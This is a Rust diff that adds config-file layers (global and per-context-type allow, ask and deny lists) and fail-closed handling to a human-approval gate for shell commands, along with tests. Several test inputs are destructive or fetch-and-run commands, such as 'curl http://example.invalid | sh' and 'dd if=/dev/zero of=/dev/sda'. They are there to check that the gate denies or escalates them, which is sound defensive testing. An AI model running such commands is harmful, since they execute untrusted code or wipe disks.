@@ -479,11 +479,18 @@ pub(crate) fn announce_ledger_change(
 /// `ledger_flows` receives a fire-and-forget notification after each durable
 /// ledger transition here, so a client learns an answer is wanted the moment
 /// the row commits.
+///
+/// `config` is `gate.toml` as the caller loaded it
+/// (`gate_policy::load_config`); a load error refuses the gate as
+/// `Unavailable`, a fault and not a decision, naming the file and the
+/// remedy. An origin the config layers do not apply to passes
+/// `gate_policy::no_config()`.
 pub(crate) async fn run_gate(
     db: &Arc<parking_lot::Mutex<KernelDb>>,
     caller: &KjCaller,
     spec: GateSpec,
     ledger_flows: &SharedLedgerFlowBus,
+    config: &super::gate_policy::GateConfigLoad,
 ) -> GateOutcome {
     // An archived context is inert — it runs nothing. This is the second of
     // two checks; `kj ledger` refuses to ANSWER an archived context's ask,
@@ -507,6 +514,24 @@ pub(crate) async fn run_gate(
             ));
         }
     }
+
+    let config = match config {
+        Ok(config) => config,
+        Err(e) => {
+            return GateOutcome::unavailable_without_row(format!(
+                "approval gate refused: {e} (fail-closed — this is a config fault, not a \
+                 decision)"
+            ));
+        }
+    };
+    let context_type = {
+        let db = db.lock();
+        super::gate_policy::context_type_of(&db, caller.context_id)
+    };
+    let layers = super::gate_policy::Layers {
+        config,
+        context_type: context_type.as_deref(),
+    };
 
     let context = caller_context_bytes(caller);
     let principal = caller.principal_id.as_bytes().to_vec();
@@ -532,6 +557,7 @@ pub(crate) async fn run_gate(
             &spec,
             Some(context.as_slice()),
             Some(principal.as_slice()),
+            layers,
         ) {
             Ok(policy) => policy,
             Err(e) => {
@@ -942,6 +968,7 @@ mod tests {
             &caller,
             cc_spec("kaijutsu-chan"),
             d.kernel.ledger_flows(),
+            &crate::kj::gate_policy::no_config(),
         )
         .await;
 
@@ -986,6 +1013,7 @@ mod tests {
             &caller,
             cc_spec("kaijutsu-chan"),
             d.kernel.ledger_flows(),
+            &crate::kj::gate_policy::no_config(),
         )
         .await;
         assert_eq!(first.verdict, GateVerdict::Pending);
@@ -997,6 +1025,7 @@ mod tests {
             &caller,
             cc_spec("kaijutsu-chan"),
             d.kernel.ledger_flows(),
+            &crate::kj::gate_policy::no_config(),
         )
         .await;
         assert!(second.allowed(), "the answer already given must open the gate");
@@ -1028,7 +1057,7 @@ mod tests {
         let d = gate_dispatcher().await;
         let caller = test_caller();
 
-        run_gate(&d.kernel_db.clone(), &caller, cc_spec("kaijutsu-chan"), d.kernel.ledger_flows())
+        run_gate(&d.kernel_db.clone(), &caller, cc_spec("kaijutsu-chan"), d.kernel.ledger_flows(), &crate::kj::gate_policy::no_config())
             .await;
         let request_id = pending_id(&d);
         answer(&d, &request_id, true);
@@ -1038,6 +1067,7 @@ mod tests {
             &caller,
             cc_spec("kaijutsu-chan"),
             d.kernel.ledger_flows(),
+            &crate::kj::gate_policy::no_config(),
         )
         .await;
         assert_eq!(redeemed.verdict, GateVerdict::Allowed);
@@ -1047,6 +1077,7 @@ mod tests {
             &caller,
             cc_spec("kaijutsu-chan"),
             d.kernel.ledger_flows(),
+            &crate::kj::gate_policy::no_config(),
         )
         .await;
         assert_eq!(
@@ -1074,13 +1105,13 @@ mod tests {
         let d = gate_dispatcher().await;
         let caller = test_caller();
 
-        run_gate(&d.kernel_db.clone(), &caller, cc_spec("fleet-lead"), d.kernel.ledger_flows())
+        run_gate(&d.kernel_db.clone(), &caller, cc_spec("fleet-lead"), d.kernel.ledger_flows(), &crate::kj::gate_policy::no_config())
             .await;
         let request_id = pending_id(&d);
         answer(&d, &request_id, false);
 
         let second =
-            run_gate(&d.kernel_db.clone(), &caller, cc_spec("fleet-lead"), d.kernel.ledger_flows())
+            run_gate(&d.kernel_db.clone(), &caller, cc_spec("fleet-lead"), d.kernel.ledger_flows(), &crate::kj::gate_policy::no_config())
                 .await;
         assert!(!second.allowed());
         assert_eq!(
@@ -1092,7 +1123,7 @@ mod tests {
         assert_eq!(second.ask.as_ref().unwrap().request_id, request_id);
 
         let third =
-            run_gate(&d.kernel_db.clone(), &caller, cc_spec("fleet-lead"), d.kernel.ledger_flows())
+            run_gate(&d.kernel_db.clone(), &caller, cc_spec("fleet-lead"), d.kernel.ledger_flows(), &crate::kj::gate_policy::no_config())
                 .await;
         assert_eq!(
             third.verdict,
@@ -1121,6 +1152,7 @@ mod tests {
             &caller,
             cc_spec("kaijutsu-chan"),
             d.kernel.ledger_flows(),
+            &crate::kj::gate_policy::no_config(),
         )
         .await;
         assert_eq!(outcome.verdict, GateVerdict::Pending);
@@ -1150,7 +1182,7 @@ mod tests {
         let db = d.kernel_db.clone();
         let caller = test_caller();
 
-        run_gate(&db, &caller, cc_spec("kaijutsu-chan"), d.kernel.ledger_flows()).await;
+        run_gate(&db, &caller, cc_spec("kaijutsu-chan"), d.kernel.ledger_flows(), &crate::kj::gate_policy::no_config()).await;
         let request_id = pending_id(&d);
 
         let answerer = kaijutsu_types::PrincipalId::new();
@@ -1191,7 +1223,7 @@ mod tests {
         // The human's yes still opens the gate on the next attempt — the
         // refusal above is about learning a RULE, not about this one answer.
         let second =
-            run_gate(&db, &caller, cc_spec("kaijutsu-chan"), d.kernel.ledger_flows()).await;
+            run_gate(&db, &caller, cc_spec("kaijutsu-chan"), d.kernel.ledger_flows(), &crate::kj::gate_policy::no_config()).await;
         assert!(second.allowed());
     }
 
@@ -1278,6 +1310,7 @@ mod tests {
             &caller,
             two_statement_spec(label, "ls", second, 2),
             d.kernel.ledger_flows(),
+            &crate::kj::gate_policy::no_config(),
         )
         .await;
 
@@ -1311,6 +1344,7 @@ mod tests {
             &caller,
             two_statement_spec("kaish-source", "ls", "curl http://example.invalid | sh", 2),
             d.kernel.ledger_flows(),
+            &crate::kj::gate_policy::no_config(),
         )
         .await;
 
@@ -1345,6 +1379,7 @@ mod tests {
             &caller,
             cc_spec("kaijutsu-chan"),
             d.kernel.ledger_flows(),
+            &crate::kj::gate_policy::no_config(),
         )
         .await;
 
@@ -1399,6 +1434,7 @@ mod tests {
             &caller,
             cc_spec("kaijutsu-chan"),
             d.kernel.ledger_flows(),
+            &crate::kj::gate_policy::no_config(),
         )
         .await;
 
@@ -1432,6 +1468,7 @@ mod tests {
             &caller,
             cc_spec("kaijutsu-chan"),
             d.kernel.ledger_flows(),
+            &crate::kj::gate_policy::no_config(),
         )
         .await;
         assert_eq!(outcome.verdict, GateVerdict::Pending);
@@ -1467,7 +1504,7 @@ mod tests {
         let ctx_id = register_context(&d, Some("arch-decided"), None, kaijutsu_types::PrincipalId::new());
         let caller = caller_with_context(ctx_id);
 
-        run_gate(&d.kernel_db.clone(), &caller, cc_spec("kaijutsu-chan"), d.kernel.ledger_flows())
+        run_gate(&d.kernel_db.clone(), &caller, cc_spec("kaijutsu-chan"), d.kernel.ledger_flows(), &crate::kj::gate_policy::no_config())
             .await;
         let request_id = pending_id(&d);
         answer(&d, &request_id, true);
@@ -1518,6 +1555,7 @@ mod tests {
             &caller,
             cc_spec("kaijutsu-chan"),
             d.kernel.ledger_flows(),
+            &crate::kj::gate_policy::no_config(),
         )
         .await;
         assert_eq!(outcome.verdict, GateVerdict::Pending);
@@ -1554,6 +1592,7 @@ mod tests {
             &caller,
             cc_spec("kaijutsu-chan"),
             d.kernel.ledger_flows(),
+            &crate::kj::gate_policy::no_config(),
         )
         .await;
         assert_eq!(first.verdict, GateVerdict::Pending);
@@ -1569,6 +1608,7 @@ mod tests {
             &caller,
             cc_spec("kaijutsu-chan"),
             d.kernel.ledger_flows(),
+            &crate::kj::gate_policy::no_config(),
         )
         .await;
         assert_eq!(second.verdict, GateVerdict::Allowed);
@@ -1597,7 +1637,7 @@ mod tests {
         seed_cwd(&d.kernel_db, ctx_id, "/original/dir");
         let caller = caller_with_context(ctx_id);
 
-        run_gate(&d.kernel_db.clone(), &caller, cc_spec("kaijutsu-chan"), d.kernel.ledger_flows())
+        run_gate(&d.kernel_db.clone(), &caller, cc_spec("kaijutsu-chan"), d.kernel.ledger_flows(), &crate::kj::gate_policy::no_config())
             .await;
         let request_id = pending_id(&d);
         answer(&d, &request_id, true);
@@ -1607,6 +1647,7 @@ mod tests {
             &caller,
             cc_spec("kaijutsu-chan"),
             d.kernel.ledger_flows(),
+            &crate::kj::gate_policy::no_config(),
         )
         .await;
         assert_eq!(redeemed.verdict, GateVerdict::Allowed);
@@ -1634,6 +1675,7 @@ mod tests {
             &caller,
             cc_spec("kaijutsu-chan"),
             d.kernel.ledger_flows(),
+            &crate::kj::gate_policy::no_config(),
         )
         .await;
         assert_eq!(outcome.verdict, GateVerdict::Pending);
@@ -1662,7 +1704,7 @@ mod tests {
         let mut executing = cc_spec("kaijutsu-chan");
         executing.exec_source = Some("echo hi".into());
         let executing_outcome =
-            run_gate(&d.kernel_db.clone(), &caller, executing, d.kernel.ledger_flows()).await;
+            run_gate(&d.kernel_db.clone(), &caller, executing, d.kernel.ledger_flows(), &crate::kj::gate_policy::no_config()).await;
         assert_eq!(executing_outcome.verdict, GateVerdict::Pending);
         assert_eq!(
             executing_outcome.reason, PENDING_REASON_EXECUTES,
@@ -1674,6 +1716,7 @@ mod tests {
             &caller,
             cc_spec("kaijutsu-chan"),
             d.kernel.ledger_flows(),
+            &crate::kj::gate_policy::no_config(),
         )
         .await;
         assert_eq!(retry_outcome.verdict, GateVerdict::Pending);
@@ -1702,7 +1745,7 @@ mod tests {
         let caller = caller_with_context(ctx_id);
 
         let spec = crate::kj::shell_gate::build_shell_gate_spec("echo ${FOO}").unwrap();
-        let outcome = run_gate(&d.kernel_db.clone(), &caller, spec, d.kernel.ledger_flows()).await;
+        let outcome = run_gate(&d.kernel_db.clone(), &caller, spec, d.kernel.ledger_flows(), &crate::kj::gate_policy::no_config()).await;
         assert_eq!(outcome.verdict, GateVerdict::Pending);
         let request_id = outcome.ask.expect("an escalated ask has a row").request_id;
 
@@ -1741,7 +1784,7 @@ mod tests {
             arguments: serde_json::json!({ "command": "echo ${FOO}" }),
         };
         let spec = crate::kj::hook_gate::build_hook_gate_spec("h", "hooked".into(), &params);
-        let outcome = run_gate(&d.kernel_db.clone(), &caller, spec, d.kernel.ledger_flows()).await;
+        let outcome = run_gate(&d.kernel_db.clone(), &caller, spec, d.kernel.ledger_flows(), &crate::kj::gate_policy::no_config()).await;
         assert_eq!(outcome.verdict, GateVerdict::Pending);
         let request_id = outcome.ask.expect("an escalated ask has a row").request_id;
 
@@ -1767,7 +1810,7 @@ mod tests {
         caller.context_id = None;
 
         let spec = crate::kj::shell_gate::build_shell_gate_spec("echo ${FOO}").unwrap();
-        let outcome = run_gate(&d.kernel_db.clone(), &caller, spec, d.kernel.ledger_flows()).await;
+        let outcome = run_gate(&d.kernel_db.clone(), &caller, spec, d.kernel.ledger_flows(), &crate::kj::gate_policy::no_config()).await;
         assert_eq!(outcome.verdict, GateVerdict::Pending);
         let request_id = outcome.ask.expect("still a normal escalation").request_id;
 
@@ -1799,7 +1842,7 @@ mod tests {
         let caller = test_caller();
         let spec = crate::kj::shell_gate::build_shell_gate_spec("kj block list").unwrap();
         let outcome =
-            run_gate(&d.kernel_db.clone(), &caller, spec, d.kernel.ledger_flows()).await;
+            run_gate(&d.kernel_db.clone(), &caller, spec, d.kernel.ledger_flows(), &crate::kj::gate_policy::no_config()).await;
 
         assert!(outcome.allowed(), "{}", outcome.reason);
         assert_eq!(outcome.verdict, GateVerdict::Allowed);
@@ -1834,7 +1877,7 @@ mod tests {
         seed_deny_rule(&d.kernel_db, &digest, &spec.authorized_label);
 
         let outcome =
-            run_gate(&d.kernel_db.clone(), &caller, spec, d.kernel.ledger_flows()).await;
+            run_gate(&d.kernel_db.clone(), &caller, spec, d.kernel.ledger_flows(), &crate::kj::gate_policy::no_config()).await;
 
         assert_eq!(outcome.verdict, GateVerdict::Denied, "{}", outcome.reason);
         assert!(
@@ -1856,7 +1899,7 @@ mod tests {
         spec.statements[0].vars.clear();
 
         let outcome =
-            run_gate(&d.kernel_db.clone(), &caller, spec, d.kernel.ledger_flows()).await;
+            run_gate(&d.kernel_db.clone(), &caller, spec, d.kernel.ledger_flows(), &crate::kj::gate_policy::no_config()).await;
 
         assert_eq!(outcome.verdict, GateVerdict::Pending, "{}", outcome.reason);
     }
@@ -1876,13 +1919,177 @@ mod tests {
         let spec = crate::kj::hook_gate::build_hook_gate_spec("lfm2d-advisory", "d".into(), &params);
 
         let outcome =
-            run_gate(&d.kernel_db.clone(), &caller, spec, d.kernel.ledger_flows()).await;
+            run_gate(&d.kernel_db.clone(), &caller, spec, d.kernel.ledger_flows(), &crate::kj::gate_policy::no_config()).await;
 
         assert!(outcome.allowed(), "{}", outcome.reason);
         assert!(
-            outcome.reason.contains("builtin allows kj block list, kj ledger"),
+            outcome.reason.contains("builtin allows kj block list")
+                && outcome.reason.contains("builtin allows kj ledger"),
             "{}",
             outcome.reason
         );
+    }
+
+    // ── The config layers (gate policy slice 2) ─────────────────────
+
+    fn gate_config(text: &str) -> crate::kj::gate_policy::GateConfigLoad {
+        Ok(crate::kj::gate_policy::GateConfig::parse(text).expect("test config parses"))
+    }
+
+    /// A deny-tier key refuses inside `run_gate` with a durable row naming
+    /// the layer and key.
+    #[tokio::test]
+    async fn a_config_deny_refuses_the_shell_gate_with_a_row() {
+        let d = gate_dispatcher().await;
+        let caller = test_caller();
+        let spec = crate::kj::shell_gate::build_shell_gate_spec("dd if=/dev/zero of=/dev/sda").unwrap();
+        let config = gate_config("[global]\ndeny = [\"dd\"]\n");
+        let outcome =
+            run_gate(&d.kernel_db.clone(), &caller, spec, d.kernel.ledger_flows(), &config).await;
+        assert_eq!(outcome.verdict, GateVerdict::Denied, "{}", outcome.reason);
+        assert!(outcome.reason.contains("global config denies dd"), "{}", outcome.reason);
+        let ask = outcome.ask.as_ref().expect("an auto-deny leaves a durable row");
+        assert_eq!(ask.status, AskStatus::Denied);
+    }
+
+    /// An ask-tier key is firm: the builtin layer would allow `kj block
+    /// list`, and the config's ask outranks it, so a human is asked.
+    #[tokio::test]
+    async fn a_config_ask_escalates_a_statement_the_builtin_layer_would_allow() {
+        let d = gate_dispatcher().await;
+        let caller = test_caller();
+        let spec = crate::kj::shell_gate::build_shell_gate_spec("kj block list").unwrap();
+        let config = gate_config("[global]\nask = [\"kj block list\"]\n");
+        let outcome =
+            run_gate(&d.kernel_db.clone(), &caller, spec, d.kernel.ledger_flows(), &config).await;
+        assert_eq!(outcome.verdict, GateVerdict::Pending, "{}", outcome.reason);
+    }
+
+    /// Top wins: a human's allow rule on the exact statement outranks a
+    /// config deny on its key.
+    #[tokio::test]
+    async fn a_user_allow_rule_outranks_a_config_deny() {
+        let d = gate_dispatcher().await;
+        let caller = test_caller();
+        let source = "dd if=/dev/zero of=/tmp/scratch";
+        let config = gate_config("[global]\ndeny = [\"dd\"]\n");
+
+        // First attempt: refused by config. Then a human allows the exact
+        // statement and remembers it.
+        let spec = crate::kj::shell_gate::build_shell_gate_spec(source).unwrap();
+        let digest = statement_digest(Origin::ShellGate, &spec.statements[0].rendered);
+        let label = spec.authorized_label.clone();
+        seed_allow_rule(&d.kernel_db, &digest, &label);
+
+        let outcome =
+            run_gate(&d.kernel_db.clone(), &caller, spec, d.kernel.ledger_flows(), &config).await;
+        assert_eq!(outcome.verdict, GateVerdict::Allowed, "{}", outcome.reason);
+        assert!(outcome.reason.contains("user rule allows"), "{}", outcome.reason);
+    }
+
+    /// The context_type layer reads the calling context's row.
+    #[tokio::test]
+    async fn the_context_type_layer_applies_to_the_calling_context_s_type() {
+        let d = gate_dispatcher().await;
+        let principal = kaijutsu_types::PrincipalId::new();
+        let context_id =
+            crate::kj::test_helpers::register_context(&d, Some("ctype-gate"), None, principal);
+        d.kernel_db.lock().update_context_type(context_id, "explorer").unwrap();
+        let caller = crate::kj::test_helpers::caller_with_context(context_id);
+        let config = gate_config(
+            "[global]\nallow = [\"kj context create\"]\n[context_type.explorer]\ndeny = [\"kj context create\"]\n",
+        );
+
+        let spec = crate::kj::shell_gate::build_shell_gate_spec("kj context create x").unwrap();
+        let outcome =
+            run_gate(&d.kernel_db.clone(), &caller, spec, d.kernel.ledger_flows(), &config).await;
+        assert_eq!(outcome.verdict, GateVerdict::Denied, "{}", outcome.reason);
+        assert!(outcome.reason.contains("context_type config (explorer) denies"), "{}", outcome.reason);
+
+        // Another context of no particular type gets the global allow.
+        let other = test_caller();
+        let spec = crate::kj::shell_gate::build_shell_gate_spec("kj context create x").unwrap();
+        let outcome =
+            run_gate(&d.kernel_db.clone(), &other, spec, d.kernel.ledger_flows(), &config).await;
+        assert_eq!(outcome.verdict, GateVerdict::Allowed, "{}", outcome.reason);
+    }
+
+    /// A file that does not load is a fault, not a decision: the gate is
+    /// unavailable, nothing runs, and the reason names the remedy.
+    #[tokio::test]
+    async fn an_unusable_gate_toml_makes_the_gate_unavailable() {
+        let d = gate_dispatcher().await;
+        let caller = test_caller();
+        let spec = crate::kj::shell_gate::build_shell_gate_spec("kj block list").unwrap();
+        let config: crate::kj::gate_policy::GateConfigLoad =
+            Err(crate::kj::gate_policy::GateConfigError::Parse("line 3: bad".into()));
+        let outcome =
+            run_gate(&d.kernel_db.clone(), &caller, spec, d.kernel.ledger_flows(), &config).await;
+        assert_eq!(outcome.verdict, GateVerdict::Unavailable, "{}", outcome.reason);
+        assert!(outcome.ask.is_none(), "no row for a fault");
+        assert!(
+            outcome.reason.contains("gate.toml") && outcome.reason.contains("kj config reset"),
+            "{}",
+            outcome.reason
+        );
+    }
+
+    fn seed_allow_rule(db: &Arc<parking_lot::Mutex<KernelDb>>, digest: &str, label: &str) {
+        let seed = approval_ledger::types::NewAsk {
+            context_id: vec![],
+            principal_id: vec![],
+            origin: Origin::ShellGate,
+            instance: Some("builtin.shell_write".into()),
+            tool: Some("shell_write".into()),
+            hook_id: None,
+            description: "test fixture: seed an allow rule".into(),
+            statements: vec![approval_ledger::types::NewPlanStatement {
+                statement_digest: digest.to_string(),
+                rendered: "(fixture statement)".into(),
+                statement_kind: "command".into(),
+                commands: vec![NewPlanCommand {
+                    name: "seed".into(),
+                    args: vec![],
+                    redirects: vec![],
+                    backgrounded: false,
+                }],
+                vars: vec![],
+            }],
+            authorized_label: Some(label.to_string()),
+            rc_run_id: None,
+            expires_at: None,
+            options: vec![],
+            signals: vec![],
+            cwd: None,
+            exec_source: None,
+            env: vec![],
+        };
+        let db = db.lock();
+        let conn = db.conn_for_ledger();
+        let request_id = approval_ledger::ask::create_ask(conn, &seed).unwrap();
+        approval_ledger::decide::decide(
+            conn,
+            &request_id,
+            approval_ledger::decide::DecideInput {
+                allow: true,
+                decided_by: Some(approval_ledger::decide::Answerer {
+                    principal: &[1, 2, 3],
+                    context: Some(&[4, 5, 6]),
+                }),
+                decided_option: Some("allow_always"),
+                remember_scope: None,
+                auto_reason: None,
+            },
+        )
+        .unwrap();
+        approval_ledger::rules::learn_from_approval(
+            conn,
+            &request_id,
+            0,
+            approval_ledger::types::RuleScope::Always,
+            true,
+            Some(&[1, 2, 3]),
+        )
+        .unwrap();
     }
 }
